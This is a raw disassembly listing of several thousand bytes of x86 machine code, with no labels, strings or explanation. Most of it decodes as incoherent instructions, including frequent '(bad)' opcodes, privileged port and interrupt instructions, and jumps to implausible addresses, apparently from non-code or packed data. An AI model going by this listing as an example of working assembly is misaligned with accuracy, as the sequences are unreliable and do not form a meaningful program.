  430bcf:	push   ebp
  430bd0:	mov    ecx,DWORD PTR [ebx-0x2cff1728]
  430bd6:	push   0xaf80d6
  430bdb:	mov    eax,DWORD PTR [eax]
  430bdd:	in     al,0xff
  430bdf:	sti    
  430be0:	sbb    dh,cl
  430be2:	pop    esi
  430be3:	xchg   esp,eax
  430be4:	leave  
  430be5:	fwait
  430be6:	add    al,0x32
  430be8:	push   ebp
  430be9:	cmp    ebp,esp
  430beb:	sqrtps xmm3,XMMWORD PTR [esi+0x4d]
  430bef:	dec    DWORD PTR [ecx-0x740f0375]
  430bf5:	push   ebp
  430bf6:	cld    
  430bf7:	xor    ebp,ebx
  430bf9:	add    ecx,DWORD PTR [ebx-0x743576f1]
  430bff:	push   ebp
  430c00:	clc    
  430c01:	xor    esi,ecx
  430c03:	add    esi,DWORD PTR [ebp-0x75]
  430c06:	(bad)  
  430c07:	hlt    
  430c08:	or     DWORD PTR [esi+eax*8-0x39cdf865],ecx
  430c0f:	mov    DWORD PTR [esi],eax
  430c11:	hlt    
  430c12:	(bad)  
  430c13:	dec    ebp
  430c14:	add    esi,DWORD PTR [ebx]
  430c16:	(bad)  
  430c17:	mov    edx,0xffc68d0a
  430c1c:	add    dl,cl
  430c1e:	leave  
  430c1f:	push   ebp
  430c20:	push   ebp
  430c21:	mov    ebp,esp
  430c23:	fcom   QWORD PTR [ecx+0x7d]
  430c26:	inc    ebp
  430c27:	xor    ecx,DWORD PTR [ecx-0x74f003fd]
  430c2d:	iret   
  430c2e:	cld    
  430c2f:	retf   0x868f
  430c32:	loopne 0x430c31
  430c34:	mov    edi,edi
  430c36:	mov    esi,DWORD PTR [ebp-0x8]
  430c39:	mov    esi,eax
  430c3b:	cld    
  430c3c:	jne    0x430bee
  430c3e:	mov    BYTE PTR [ecx],0xa
  430c41:	add    dh,al
  430c43:	test   DWORD PTR [eax],ecx
  430c45:	inc    esi
  430c47:	inc    DWORD PTR [edi]
  430c49:	mov    eax,esi
  430c4b:	cld    
  430c4c:	add    DWORD PTR [eax+0x901c6],eax
  430c52:	leave  
  430c53:	xor    BYTE PTR [ebp+0x45],dl
  430c56:	in     al,dx
  430c57:	mov    edx,DWORD PTR [ecx-0x40]
  430c5a:	inc    ebp
  430c5b:	add    BYTE PTR [ecx-0x74000301],cl
  430c61:	int3   
  430c62:	cld    
  430c63:	jne    0x430c1d
  430c65:	call   0xcc1f70
  430c6a:	mov    esi,DWORD PTR [ebp-0x8]
  430c6d:	test   eax,esi
  430c6f:	je     0x430ce6
  430c71:	mov    eax,esi
  430c73:	cld    
  430c74:	add    al,0x80
  430c76:	add    WORD PTR [ecx+0x0],ax
  430c7a:	fiadd  DWORD PTR [eax]
  430c7c:	mov    BYTE PTR [eax],0x3d
  430c7f:	push   0xffffffc3
  430c81:	push   esi
  430c82:	mov    edx,DWORD PTR [eax+0x51]
  430c85:	pop    edi
  430c86:	lea    ebx,[ebx-0x8]
  430c89:	ret    0x45
  430c8c:	mov    ecx,DWORD PTR [ebx-0x7240ae04]
  430c92:	xchg   eax,edi
  430c94:	mov    DWORD PTR [ebp-0x75],ecx
  430c97:	push   esi
  430c98:	clc    
  430c99:	jne    0x430c6b
  430c9b:	mov    ecx,0xf8450b0b
  430ca0:	(bad)  
  430ca1:	push   cs
  430ca2:	or     BYTE PTR [ebp-0x3a],dh
  430ca5:	cmp    eax,DWORD PTR [ecx]
  430ca7:	pop    esi
  430ca8:	(bad)  
  430ca9:	or     al,0x5
  430cab:	inc    eax
  430cac:	leave  
  430cad:	jmp    0x40cf:0x25564204
  430cb4:	leave  
  430cb5:	in     eax,dx
  430cb6:	inc    DWORD PTR [eax-0x75]
  430cb9:	fimul  DWORD PTR [ebx-0x228139be]
  430cbf:	inc    eax
  430cc0:	nop
  430cc1:	loopne 0x430cc2
  430cc3:	ret    
  430cc4:	mov    ecx,DWORD PTR [ebx-0x7239ae75]
  430cca:	add    eax,0xff45e8f8
  430ccf:	push   esi
  430cd0:	push   DWORD PTR [ebp-0x39]
  430cd3:	mov    eax,0x7edda46
  430cd8:	or     al,0x6
  430cda:	push   DWORD PTR [ebp-0x3a]
  430cdd:	cmp    eax,DWORD PTR [edx]
  430cdf:	pop    esi
  430ce0:	ret    
  430ce1:	or     al,0x56
  430ce3:	inc    ecx
  430ce4:	push   ebp
  430ce5:	jle    0x430cd3
  430ce7:	inc    edx
  430ce8:	inc    ebp
  430ce9:	int    0x1
  430ceb:	inc    ecx
  430cec:	sub    BYTE PTR ds:0xe77541fc,ah
  430cf2:	add    DWORD PTR [edx+0x1c],eax
  430cf5:	retf   0xc38b
  430cf8:	adc    al,0x8b
  430cfa:	xchg   edx,eax
  430cfb:	push   ecx
  430cfc:	mov    cl,BYTE PTR [ebp+0x45c8f8fe]
  430d02:	rcl    DWORD PTR [esi-0x9],cl
  430d05:	jne    0x430d57
  430d07:	mov    eax,0x7c80ece
  430d0c:	rol    DWORD PTR [esi],cl
  430d0e:	div    DWORD PTR [ebp+0x50]
  430d11:	cmp    ecx,edx
  430d13:	pop    esi
  430d14:	dec    BYTE PTR [edx]
  430d16:	in     al,dx
  430d17:	inc    edx
  430d18:	sub    esp,ecx
  430d1a:	inc    eax
  430d1b:	(bad)  
  430d1c:	push   eax
  430d1d:	add    edx,DWORD PTR [eax-0x1f]
  430d20:	push   edi
  430d21:	add    dh,dh
  430d23:	leave  
  430d24:	adc    DWORD PTR [ebp-0x1],0xffffffec
  430d28:	add    BYTE PTR [ecx+0x0],dl
  430d2b:	inc    ebp
  430d2c:	ror    DWORD PTR [ecx+0x5536fc8d],cl
  430d32:	add    BYTE PTR [eax-0x7fbf448],bh
  430d38:	add    al,0x2
  430d3a:	jmp    0x57eb894
  430d3f:	jne    0x430d29
  430d41:	mov    eax,DWORD PTR [edx]
  430d43:	or     BYTE PTR [eax],al
  430d45:	inc    ecx
  430d46:	stc    
  430d47:	in     eax,dx
  430d48:	ss inc eax
  430d4a:	aas    
  430d4b:	out    0x7d,eax
  430d4d:	inc    ecx
  430d4e:	mov    ebp,ecx
  430d50:	lock ret 0x7d
  430d54:	and    ecx,DWORD PTR [ebx-0x171777]
  430d5a:	add    bh,bh
  430d5c:	aad    0xd7
  430d5e:	add    dh,cl
  430d60:	clts   
  430d62:	(bad)  
  430d63:	call   0xffce0c68
  430d68:	hlt    
  430d69:	iret   
  430d6a:	jge    0x430d42
  430d6c:	rol    DWORD PTR [esi-0x80],cl
  430d6f:	jmp    0x1c5c7c
  430d74:	out    dx,al
  430d75:	mov    eax,DWORD PTR [ebx]
  430d77:	(bad)  
  430d78:	pop    esi
  430d79:	push   es
  430d7a:	cmp    al,0xe8
  430d7c:	sar    edi,0x8
  430d7f:	inc    DWORD PTR [edi]
  430d81:	inc    esi
  430d82:	(bad)  
  430d83:	loopne 0x430e03
  430d85:	push   edi
  430d86:	push   cs
  430d87:	push   ebx
  430d88:	add    BYTE PTR [ebx+0x24008b56],cl
  430d8e:	add    BYTE PTR [ebp+0x50],al
  430d91:	push   eax
  430d92:	add    DWORD PTR [ebx+0x757d1834],ecx
  430d98:	sub    edx,DWORD PTR [esi-0x24]
  430d9b:	jne    0x430d53
  430d9d:	lods   eax,DWORD PTR ds:[esi]
  430d9e:	mov    edx,DWORD PTR [edx-0x34]
  430da1:	dec    esi
  430da2:	out    0x83,eax
  430da4:	into   
  430da5:	push   edi
  430da7:	loopne 0x430d77
  430da9:	shr    BYTE PTR [edx+ecx*4+0x0],1
  430dad:	and    DWORD PTR [edx-0x741fff01],0xffffffd0
  430db4:	rol    DWORD PTR [edx],0x8
  430db7:	mov    esp,ecx
  430db9:	cmp    DWORD PTR [ebx],0xc
  430dbc:	mov    esi,0x5001c0
  430dc1:	push   eax
  430dc2:	push   cs
  430dc3:	push   eax
  430dc4:	(bad)  
  430dc5:	sub    edx,edi
  430dc7:	push   esi
  430dc8:	adc    al,0xcb
  430dca:	ins    DWORD PTR es:[edi],dx
  430dcb:	mov    eax,0x203e8
  430dd0:	add    al,ah
  430dd2:	ror    BYTE PTR [eax+0xc007c0],0xc0
  430dd9:	add    dh,al
  430ddb:	add    ah,ch
  430ddd:	rol    DWORD PTR [ebx-0x3595fb0d],1
  430de3:	pop    ecx
  430de4:	or     eax,ebx
  430de6:	cli    
  430de7:	add    BYTE PTR [ecx-0x4e728d1e],dh
  430ded:	lea    ebp,[ebx]
  430def:	mov    edx,DWORD PTR [edx-0x4]
  430df2:	dec    ecx
  430df3:	inc    ebp
  430df4:	shr    BYTE PTR [ebx],0x4b
  430df7:	and    al,0x0
  430df9:	(bad)  
  430dfa:	jne    0x430e41
  430dfc:	pop    eax
  430dfd:	mov    al,0x5a
  430dff:	call   0x142105e
  430e04:	and    al,0x85
  430e06:	push   edx
  430e07:	add    BYTE PTR [eax+eax*1+0x0],ah
  430e0b:	dec    ebp
  430e0c:	mov    cl,0x23
  430e0e:	jmp    0x430dfc
  430e10:	mov    al,0xe7
  430e12:	call   0x1391100
  430e17:	shr    DWORD PTR [eax+ebx*2],cl
  430e1a:	lock (bad) 
  430e1c:	adc    eax,0x757f008d
  430e21:	out    0x58,eax
  430e23:	cmp    al,0x7
  430e25:	pop    edx
  430e26:	or     DWORD PTR [edx+eax*1-0x74fff494],ecx
  430e2d:	push   ecx
  430e2e:	cld    
  430e2f:	mov    esi,0x3b0175
  430e34:	and    al,0xb0
  430e36:	xor    BYTE PTR [edx+0x1],0x8b
  430e3a:	add    ah,bh
  430e3c:	mov    edi,DWORD PTR [ebp-0x4]
  430e3f:	psubsw mm7,QWORD PTR [edi]
  430e42:	add    DWORD PTR [ebp+0x0],ebp
  430e45:	rcr    eax,1
  430e47:	mov    edi,ecx
  430e49:	and    eax,DWORD PTR [eax]
  430e4b:	add    ecx,DWORD PTR [ebx+0x1b4dd88d]
  430e51:	call   0x130113a
  430e56:	add    al,cl
  430e58:	mov    ebp,esi
  430e5a:	aam    0x83
  430e5c:	or     DWORD PTR [ecx],eax
  430e5e:	jne    0x430e51
  430e60:	mov    eax,DWORD PTR [eax]
  430e62:	aam    0x0
  430e64:	dec    ebp
  430e65:	jne    0x430df2
  430e67:	cmp    ebx,eax
  430e69:	jb     0x430eb8
  430e6b:	jmp    0x430df8
  430e6d:	mov    ebx,esp
  430e6f:	int3   
  430e70:	dec    ebp
  430e71:	or     DWORD PTR [ecx+0x5f8bdc00],0xffffff8b
  430e78:	mov    edx,0x8b0a8b
  430e7d:	cmp    ecx,DWORD PTR [eax]
  430e7f:	jb     0x430e58
  430e81:	pop    edx
  430e82:	push   edi
  430e83:	cli    
  430e84:	pop    es
  430e85:	mov    eax,ecx
  430e87:	jb     0x430e8b
  430e89:	add    DWORD PTR [ebx],0xa
  430e8c:	mov    eax,DWORD PTR [ebx]
  430e8e:	int3   
  430e8f:	add    bh,BYTE PTR [esi+0x75d10006]
  430e95:	jmp    0x430e22
  430e97:	mov    al,0xe8
  430e99:	call   0x104111b
  430e9e:	add    edx,DWORD PTR [ecx+ecx*8]
  430ea1:	pop    edi
  430ea2:	or     BYTE PTR [ecx-0x73],bl
  430ea5:	pop    ecx
  430ea6:	inc    edi
  430ea7:	xor    al,0xeb
  430ea9:	push   ecx
  430eaa:	mov    edi,DWORD PTR [edx+0xc506cc]
  430eb0:	call   0xb20fb5
  430eb5:	int3   
  430eb6:	sbb    BYTE PTR [esi],ch
  430eb8:	inc    ebp
  430eb9:	add    BYTE PTR [ebx-0x1f4f338b],cl
  430ebf:	call   0x9c112e
  430ec4:	or     BYTE PTR [ebx-0x73],dl
  430ec7:	cmp    al,0x47
  430ec9:	mov    al,0x1
  430ecb:	jb     0x430ecd
  430ecd:	mov    al,0x10
  430ecf:	push   eax
  430ed0:	add    al,0x75
  430ed2:	add    BYTE PTR [ebx],ch
  430ed4:	add    ebx,esp
  430ed6:	int3   
  430ed7:	jne    0x430ee9
  430ed9:	movsx  edx,cl
  430edc:	add    DWORD PTR [eax],eax
  430ede:	add    BYTE PTR [ebp+ecx*2+0x40aa2b7d],ch
  430ee5:	mov    gs,edi
  430ee7:	add    BYTE PTR [eax-0x50],ch
  430eea:	add    al,ch
  430eec:	mov    eax,DWORD PTR [ecx]
  430eee:	sub    eax,DWORD PTR [eax]
  430ef0:	jb     0x430f67
  430ef2:	add    DWORD PTR [esp+eiz*8-0x50],esi
  430ef6:	jge    0x430ee0
  430ef8:	add    al,0x1
  430efa:	add    DWORD PTR [eax],0x0
  430efd:	jne    0x430eff
  430eff:	je     0x430f46
  430f01:	mov    eax,DWORD PTR [edi]
  430f03:	ror    BYTE PTR [ebp+0x4d],1
  430f06:	or     DWORD PTR [ecx+0x4d03d004],0x3
  430f0d:	mov    DWORD PTR [ebx-0x1eb2372c],ecx
  430f13:	mov    DWORD PTR [ebx],ebp
  430f15:	fadd   DWORD PTR [eax+0x75]
  430f18:	inc    eax
  430f19:	pop    eax
  430f1a:	lea    ebx,[ecx+0x4f]
  430f1d:	push   0xb1000003
  430f22:	out    dx,eax
  430f23:	add    ebp,DWORD PTR [edx+edx*2]
  430f26:	add    BYTE PTR [ebx+ecx*4],bh
  430f29:	mov    ch,BYTE PTR [ebx]
  430f2b:	jb     0x430f9f
  430f2d:	add    al,0x89
  430f2f:	push   eax
  430f30:	call   0x842b5ca2
  430f35:	add    DWORD PTR [eax+eax*1],eax
  430f38:	jae    0x430f4e
  430f3a:	icebp  
  430f3b:	inc    ebp
  430f3c:	mov    eax,DWORD PTR gs:[ecx]
  430f3f:	int3   
  430f40:	out    dx,al
  430f41:	loopne 0x430f90
  430f43:	sub    eax,DWORD PTR [edx]
  430f45:	push   0xffffff83
  430f47:	pop    esi
  430f48:	push   cs
  430f49:	jl     0x430f64
  430f4b:	add    al,0xaf
  430f4d:	xor    eax,0x832b6d00
  430f52:	mov    eax,DWORD PTR [edx]
  430f54:	rcr    BYTE PTR [ebp+0x754500dc],cl
  430f5a:	ror    DWORD PTR [ebx+0x7dc8e803],1
  430f60:	inc    ebp
  430f61:	shr    ebx,0x3
  430f64:	or     DWORD PTR [eax],0x4
  430f67:	push   0xffffffa5
  430f69:	pop    esi
  430f6a:	add    BYTE PTR [ecx+edx*8-0x23ff2efc],bh
  430f71:	jmp    0x430fd0
  430f73:	mov    edi,0xff0272
  430f78:	fdivr  QWORD PTR [ebp+0x5d]
  430f7b:	push   0x4e
  430f7d:	pop    ecx
  430f7e:	call   0x435383
  430f83:	mov    DWORD PTR [ebx],eax
  430f85:	in     al,0xc8
  430f87:	rol    BYTE PTR [ebp-0x75],0xc1
  430f8b:	call   0xad116c
  430f90:	pop    esi
  430f91:	enter  0xceff,0x8b
  430f95:	repz mov ecx,DWORD PTR [ebp-0x34]
  430f99:	xor    DWORD PTR [esi-0x57f0ff3c],0xffffffb0
  430fa0:	je     0x430fa2
  430fa2:	or     DWORD PTR [ebx-0x74183b24],eax
  430fa8:	jne    0x430f8e
  430faa:	jmp    0x430fa5
  430fac:	push   DWORD PTR [edx-0x24]
  430faf:	push   0x4d
  430fb1:	pop    ecx
  430fb2:	cmp    DWORD PTR [ebp+0x2],0xffffffc1
  430fb6:	jge    0x430fbe
  430fb8:	mov    eax,eax
  430fba:	sub    ebp,DWORD PTR [edx+0x24]
  430fbd:	pop    esi
  430fbe:	inc    ebp
  430fbf:	mov    esp,0x8b6077
  430fc4:	sub    ecx,DWORD PTR [ebx+0x155e8dc]
  430fca:	lods   al,BYTE PTR ds:[esi]
  430fcb:	add    BYTE PTR [ebx],bh
  430fcd:	enter  0xce73,0x49
  430fd1:	repz test DWORD PTR [ebp+0x7d],0xf0dc0f89
  430fd9:	stc    
  430fda:	jge    0x43104e
  430fdc:	jnp    0xdd42934b
  430fe2:	call   0xc610b8
  430fe7:	fadd   st(0),st
  430fe9:	dec    esi
  430fea:	ins    BYTE PTR es:[edi],dx
  430feb:	stc    
  430fec:	cmp    al,0x73
  430fee:	push   ebp
  430fef:	mov    eax,0xf8028b
  430ff4:	jne    0x430fb7
  430ff6:	mov    esi,ecx
  430ff8:	mov    esp,DWORD PTR [ebp+0x2c]
  430ffb:	add    edi,DWORD PTR [ebp-0x24]
  430ffe:	sub    esp,eax
  431000:	and    al,0x45
  431002:	cmp    cl,BYTE PTR [ecx+0x2d5fcc5b]
  431008:	sbb    al,0xee
  43100a:	pop    esi
  43100b:	call   0x83103b
  431010:	fsubr  st,st(3)
  431012:	sti    
  431013:	add    BYTE PTR gs:[ecx],bh
  431016:	add    eax,esp
  431018:	add    DWORD PTR [esi],eax
  43101a:	rol    DWORD PTR [ebp+0x8],0x29
  43101e:	mov    esp,eax
  431020:	clc    
  431021:	jne    0x431098
  431023:	mov    eax,0x8b0673
  431028:	loopne 0x43106f
  43102a:	loopne 0x430fb5
  43102c:	lods   al,BYTE PTR ds:[esi]
  43102d:	int3   
  43102e:	inc    ebp
  43102f:	mov    DWORD PTR gs:[eax+edi*8],eax
  431033:	add    al,0xc3
  431035:	sub    ecx,DWORD PTR [ebp+0x47]
  431038:	(bad)  
  43103a:	shr    BYTE PTR [ebp-0x1f],0xe8
  43103e:	add    eax,DWORD PTR [eax]
  431040:	call   0x644d145
  431045:	add    esi,DWORD PTR [esi-0x3b2efc83]
  43104b:	dec    esi
  43104c:	ins    DWORD PTR es:[edi],dx
  43104d:	in     al,dx
  43104e:	lea    eax,[eax]
  431050:	inc    ebp
  431051:	inc    ebp
  431052:	sub    ecx,DWORD PTR [ebx-0x3eba1b73]
  431058:	or     DWORD PTR [ebx-0x38ff0400],0x398b4573
  431062:	and    al,0xdc
  431064:	ror    DWORD PTR [edx+0x24],0xf7
  431068:	or     BYTE PTR [ebp+0x4c],dh
  43106b:	mov    ebx,DWORD PTR [eax+ebp*1-0x64]
  43106f:	stos   BYTE PTR es:[edi],al
  431070:	adc    edx,edi
  431072:	inc    esp
  431073:	add    edi,DWORD PTR [eax]
  431075:	jne    0x43105a
  431077:	mov    DWORD PTR [eax-0x7449db04],ecx
  43107d:	cmp    ecx,DWORD PTR [edi]
  43107f:	sub    BYTE PTR [ebp-0x7e],dl
  431082:	sar    ebp,0xb
  431085:	jmp    FWORD PTR [edi+0x2400392a]
  43108b:	sub    esi,DWORD PTR [ebx-0x73]
  43108e:	mov    esp,DWORD PTR [ecx+edi*4]
  431091:	mov    ecx,DWORD PTR [eax]
  431093:	and    BYTE PTR [eax],al
  431095:	jne    0x431061
  431097:	sub    ebp,ecx
  431099:	sbb    BYTE PTR [esi+0x32],ah
  43109c:	dec    ebp
  43109d:	push   ebp
  43109e:	add    ecx,DWORD PTR [ebx+0x7d24fc8d]
  4310a4:	ret    
  4310a5:	mov    edx,ebp
  4310a7:	leave  
  4310a8:	sub    DWORD PTR [esi+0x24],ebx
  4310ab:	ret    0x2b
  4310ae:	pop    ax
  4310b0:	push   ebp
  4310b1:	rol    BYTE PTR [ebx],0xeb
  4310b4:	add    DWORD PTR [ecx+0x6c0001],0x40
  4310bb:	jb     0x431112
  4310bd:	ret    
  4310be:	in     al,dx
  4310bf:	jecxz  0x43104c
  4310c1:	push   esi
  4310c2:	xchg   esp,eax
  4310c3:	jne    0x4310c5
  4310c5:	cmp    edx,DWORD PTR [esi+0x1c]
  4310c8:	jne    0x4310ae
  4310ca:	mov    eax,DWORD PTR [ebp-0x77]
  4310cd:	ror    DWORD PTR [ebx+0x899408],0xe0
  4310d4:	mov    esi,DWORD PTR [ebp-0x75]
  4310d7:	pop    esi
  4310d8:	nop
  4310d9:	mov    eax,DWORD PTR [eax]
  4310db:	les    ecx,FWORD PTR [ecx-0x6b3e744a]
  4310e1:	add    al,0x0
  4310e3:	inc    ebp
  4310e4:	mov    eax,DWORD PTR [ebx]
  4310e6:	mov    ebp,ebx
  4310e8:	cmp    al,0xf
  4310ea:	or     al,al
  4310ec:	inc    ebp
  4310ed:	inc    ebp
  4310ee:	xor    DWORD PTR [ebx+0x6c8bc89c],ecx
  4310f4:	cld    
  4310f5:	add    BYTE PTR [edi+0x546c16c0],dh
  4310fb:	add    BYTE PTR [ecx-0x5],dl
  4310fe:	add    eax,0x17200
  431103:	sbb    al,0x85
  431105:	dec    esp
  431106:	je     0x431140
  431108:	mov    esp,DWORD PTR [eax+ecx*8+0x20]
  43110c:	add    BYTE PTR [ebx],bh
  43110e:	(bad)  
  43110f:	and    al,0x32
  431111:	jae    0x4310af
  431113:	mov    cl,cl
  431115:	inc    DWORD PTR [esp]
  431118:	push   ebp
  431119:	shr    esp,0x8
  43111c:	in     al,dx
  43111d:	push   esp
  43111e:	add    DWORD PTR [eax],esp
  431120:	add    bl,cl
  431122:	inc    ebp
  431123:	mov    bh,0x89
  431125:	add    ah,bh
  431127:	jmp    0xca752071
  43112c:	pushf  
  43112d:	dec    esp
  43112e:	mov    edx,0xf8178520
  431133:	fst    DWORD PTR [ebp+0x0]
  431136:	mov    BYTE PTR [eax],0xc4
  431139:	sub    edx,DWORD PTR [ebx-0x3f]
  43113c:	inc    ebp
  43113d:	add    eax,0xc601da
  431142:	mov    al,0xc6
  431145:	ins    BYTE PTR es:[edi],dx
  431146:	mov    DWORD PTR [eax+0x57],0x2c0545c1
  43114d:	dec    esp
  43114e:	jmp    DWORD PTR [eax]
  431150:	inc    ebp
  431151:	fnstcw WORD PTR [esi+0x29]
  431154:	test   BYTE PTR [eax],0xc8
  431157:	rol    BYTE PTR [eax],0xc0
  43115a:	lea    ecx,[ebp-0x3cf0dbcb]
  431160:	sbb    BYTE PTR [ebx-0x75fcae0d],cl
  431166:	inc    esi
  431167:	add    DWORD PTR [eax],ebx
  431169:	add    dh,bh
  43116b:	mov    esi,DWORD PTR [edx+0x8]
  43116e:	(bad)  
  43116f:	fdiv   QWORD PTR ss:[ecx]
  431172:	(bad)  
  431173:	mov    bl,ch
  431175:	add    esi,eax
  431177:	add    dh,bl
  431179:	or     esi,eax
  43117b:	mov    dl,0xdf
  43117d:	add    esi,eax
  43117f:	add    al,ah
  431181:	push   cs
  431182:	mov    BYTE PTR [edx+0xc601e1],0xe2
  431189:	or     BYTE PTR [ebx],dh
  43118b:	dec    ecx
  43118c:	lea    eax,[ebx]
  43118e:	xor    eax,0x18fc0fc7
  431193:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  431194:	repz clc 
  431196:	add    eax,DWORD PTR [ebp+0x46]
  431199:	prefetcht0 BYTE PTR [ecx-0x2]
  43119d:	xor    eax,0x7c60872
  4311a2:	mov    esp,0xbd32c69b
  4311a7:	pop    esi
  4311a8:	mov    cl,0xbe
  4311ab:	or     al,0xc6
  4311ad:	cmp    BYTE PTR [edi-0x3fff39ff],0x0
  4311b4:	mov    BYTE PTR [ebp-0x3d39073f],0xc2
  4311bb:	add    dh,al
  4311bd:	mov    eax,ebx
  4311bf:	xor    DWORD PTR [ebx],0x35008dbc
  4311c5:	mov    ecx,DWORD PTR [edi]
  4311c7:	sbb    al,0x18
  4311c9:	inc    ebp
  4311ca:	xrelease mov DWORD PTR [ebx],0x188546f4
  4311d1:	clc    
  4311d2:	(bad)  
  4311d3:	xor    DWORD PTR [edx-0x64],esi
  4311d6:	lea    ecx,[ecx+0x45ffe838]
  4311dc:	mov    ecx,ebx
  4311de:	fadd   st,st(6)
  4311e0:	dec    ebp
  4311e1:	lds    edi,FWORD PTR [eax+0x7145fc56]
  4311e7:	out    0x1,eax
  4311e9:	inc    ebp
  4311ea:	lea    ebp,ds:0xc8ffc6ff
  4311f0:	enter  0xa33,0xc6
  4311f4:	push   ebp
  4311f5:	leave  
  4311f6:	(bad)  
  4311f7:	xor    edi,DWORD PTR [eax-0x7ff7a47]
  4311fd:	add    BYTE PTR [ebp+0x44],al
  431200:	mov    eax,esp
  431202:	mov    WORD PTR [esi+0x46398300],?
  431208:	psubusw mm4,QWORD PTR [esi-0x78]
  43120c:	add    BYTE PTR [ebx-0x1303f975],al
  431212:	add    BYTE PTR [ebp+0x1],0xeb
  431216:	add    BYTE PTR [ebp+0x38],al
  431219:	in     eax,dx
  43121a:	inc    ebp
  43121b:	inc    ebp
  43121c:	mov    ebx,ebx
  43121e:	add    BYTE PTR [ebp+0x0],0xec
  431222:	mov    DWORD PTR [ebp-0x41],eax
  431225:	sub    eax,0x2c00454e
  43122a:	ins    DWORD PTR es:[edi],dx
  43122b:	inc    ebp
  43122c:	add    BYTE PTR [esi+0x66],bh
  43122f:	test   BYTE PTR [ebp-0x2300bc],0xb6
  431236:	mov    DWORD PTR [ebx-0x2699b977],0x83b888ff
  431240:	dec    edi
  431241:	pop    es
  431242:	add    ah,ch
  431244:	mov    DWORD PTR [ebp+0x68],eax
  431247:	in     eax,dx
  431248:	inc    DWORD PTR [ebp-0x7d]
  43124b:	out    0xc0,al
  43124d:	inc    ebp
  43124e:	mov    edx,esp
  431250:	push   0x45
  431252:	(bad)  
  431253:	jmp    0xdf925810
  431258:	add    BYTE PTR [ebp-0x77],al
  43125b:	out    dx,al
  43125c:	ins    BYTE PTR es:[edi],dx
  43125d:	inc    ebp
  43125e:	jmp    edi
  431260:	add    DWORD PTR [ebp-0x14],0x7e
  431264:	mov    esi,esi
  431266:	outs   dx,BYTE PTR ds:[esi]
  431267:	inc    esp
  431268:	(bad)  
  431269:	mov    esp,0x8341b68d
  43126e:	mov    DWORD PTR [esi+0x70],eax
  431271:	fcos   
  431273:	mov    BYTE PTR [ebx-0x76f7ca7d],al
  431279:	in     al,dx
  43127a:	jb     0x431201
  43127c:	(bad)  
  43127d:	dec    DWORD PTR [ebx-0x7aba9901]
  431283:	mov    edi,edi
  431285:	fdivr  st,st(7)
  431287:	out    dx,eax
  431288:	rcl    BYTE PTR [ebx],0x66
  43128b:	mov    DWORD PTR [ebp-0xc70075],eax
  431291:	(bad)  
  431292:	std    
  431293:	cmp    eax,DWORD PTR [eax]
  431295:	jne    0x4312fd
  431297:	mov    DWORD PTR [ebp-0xba0048],eax
  43129d:	in     al,dx
  43129e:	outs   dx,BYTE PTR ds:[esi]
  43129f:	pushf  
  4312a0:	add    BYTE PTR [ebx-0x7f7a039a],cl
  4312a6:	inc    DWORD PTR [ecx]
  4312a8:	inc    DWORD PTR [eax]
  4312aa:	jae    0x4312e4
  4312ac:	add    BYTE PTR [ebp+0x850266],al
  4312b2:	inc    DWORD PTR [ebp-0x1]
  4312b5:	mov    eax,eax
  4312b7:	jl     0x43131f
  4312b9:	add    BYTE PTR [ebp-0x740077],al
  4312bf:	cld    
  4312c0:	dec    eax
  4312c1:	add    BYTE PTR [eax],0x1
  4312c4:	data16 add BYTE PTR [ebp+0x38],al
  4312c8:	mov    eax,0x47c2
  4312cd:	mov    eax,0x824f89
  4312d2:	inc    edi
  4312d3:	mov    DWORD PTR [edx+0x64],ebp
  4312d6:	inc    WORD PTR [ebp-0x75]
  4312da:	(bad)  
  4312db:	data16 rol BYTE PTR [ebp-0x16001a],1
  4312e2:	inc    ebp
  4312e3:	jge    0x4312c4
  4312e5:	add    bh,ah
  4312e7:	lea    ax,[ebp-0x750030]
  4312ee:	add    al,0x46
  4312f1:	jmp    0x40ff:0x8885
  4312f7:	push   DWORD PTR [ebp+0x52]
  4312fa:	lea    eax,[eax]
  4312fc:	shl    BYTE PTR [esi-0x7b],1
  4312ff:	test   esi,edi
  431301:	(bad)  
  431302:	(bad)  
  431303:	inc    DWORD PTR [ebp-0x990140]
  431309:	test   DWORD PTR [ebx+0x54fff4ff],ecx
  43130f:	inc    edi
  431310:	push   ecx
  431311:	xor    ax,WORD PTR [ebp-0x8d0045]
  431318:	add    al,al
  43131a:	ret    
  43131b:	mov    ax,WORD PTR [ebp-0x3f0004]
  431322:	push   eax
  431323:	mov    DWORD PTR [ebp-0x77],0xff98748b
  43132a:	add    BYTE PTR [ebx-0x764f8839],al
  431330:	push   DWORD PTR [esi+0x1]
  431333:	inc    DWORD PTR [eax]
  431335:	mov    eax,0xff99ff
  43133a:	or     BYTE PTR [ecx-0x7a87bb],cl
  431340:	jne    0x4312fa
  431342:	add    DWORD PTR [edx-0x76edff71],0xff707a8e
  43134c:	mov    ecx,0xd74fb8
  431351:	add    cl,al
  431353:	mov    DWORD PTR [ecx-0x3f007784],ecx
  431359:	or     DWORD PTR [ebx+0x558966dc],0x7e
  431360:	(bad)  
  431361:	push   ebp
  431363:	mov    eax,0x8c2789
  431368:	ret    0x6689
  43136b:	adc    BYTE PTR [ebp+0x48],0x8d
  43136f:	add    bh,ah
  431371:	mov    WORD PTR [ebp-0x70],ax
  431375:	(bad)  
  431376:	ret    0x667d
  431379:	or     BYTE PTR [ebp-0x77],dl
  43137c:	lea    eax,[ecx+eiz*8-0x6b1276bb]
  431383:	loop   0x43130e
  431385:	(bad)  
  431386:	xchg   esi,eax
  431387:	aam    0xcf
  431389:	out    dx,al
  43138a:	mov    DWORD PTR [esi-0x68],edi
  43138d:	inc    ebp
  43138e:	dec    edx
  43138f:	pop    ecx
  431390:	mov    edx,DWORD PTR [eax]
  431392:	repnz push bp
  431395:	or     BYTE PTR [ebx+0x55106638],0x49
  43139c:	(bad)  
  43139d:	repnz xor eax,0xa0898945
  4313a3:	mov    ah,0x89
  4313a5:	jmp    DWORD PTR [edx+0x66b0418d]
  4313ab:	inc    DWORD PTR [ebp+0x50]
  4313ae:	add    DWORD PTR [ebp-0x5],0xffffffbe
  4313b2:	mov    DWORD PTR [eax],ecx
  4313b4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4313b5:	pop    es
  4313b6:	inc    ecx
  4313b7:	(bad)  
  4313b8:	data16 fwait
  4313ba:	inc    ebp
  4313bb:	xor    ah,BYTE PTR [esi+0x3]
  4313be:	dec    ebp
  4313bf:	push   eax
  4313c0:	inc    bp
  4313c2:	jge    0x431347
  4313c4:	mov    esp,DWORD PTR [esi-0x18]
  4313c7:	mov    esi,DWORD PTR [edi+0x7d809cfc]
